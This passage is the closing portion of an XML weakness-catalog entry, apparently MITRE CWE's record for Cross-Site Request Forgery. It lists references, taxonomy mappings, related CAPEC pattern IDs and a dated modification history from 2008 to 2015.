               <Reference_Link>http://software-security.sans.org/blog/2010/03/03/top-25-series-rank-4-cross-site-request-forgery</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.352.8">
               <Reference_Author>Jeff Atwood</Reference_Author>
               <Reference_Title>Preventing CSRF and XSRF Attacks</Reference_Title>
               <Reference_Date>2008-10-14</Reference_Date>
               <Reference_Link>http://www.codinghorror.com/blog/2008/10/preventing-csrf-and-xsrf-attacks.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-21" Local_Reference_ID="R.352.9">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>OWASP Enterprise Security API (ESAPI) Project</Reference_Title>
               <Reference_Link>http://www.owasp.org/index.php/ESAPI</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="PLOVER">
               <Mapped_Node_Name>Cross-Site Request Forgery (CSRF)</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2007">
               <Mapped_Node_Name>Cross Site Request Forgery (CSRF)</Mapped_Node_Name>
               <Mapped_Node_ID>A5</Mapped_Node_ID>
               <Mapping_Fit>Exact</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="WASC">
               <Mapped_Node_Name>Cross-site Request Forgery </Mapped_Node_Name>
               <Mapped_Node_ID>9</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>111</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>462</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>467</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>62</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>PLOVER</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier>Eric Dalci</Modifier>
               <Modifier_Organization>Cigital</Modifier_Organization>
               <Modification_Date>2008-07-01</Modification_Date>
               <Modification_Comment>updated Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Alternate_Terms, Description, Relationships,
						Other_Notes, Relationship_Notes, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Description,
						Likelihood_of_Exploit, Observed_Examples, Other_Notes,
						Potential_Mitigations, References, Relationship_Notes, Relationships,
						Research_Gaps, Theoretical_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="External">
               <Modifier>Tom Stracener</Modifier>
               <Modification_Date>2009-05-20</Modification_Date>
               <Modification_Comment>Added demonstrative example for
						profile.</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-05-27</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Demonstrative_Examples,
						Detection_Factors, Likelihood_of_Exploit, Observed_Examples,
						Potential_Mitigations, Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Detection_Factors,
						References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors,
						Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-07-17</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Detection_Factors</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
         </Content_History>
      </Compound_Element></Compound_Elements>
            </Weakness_Catalog>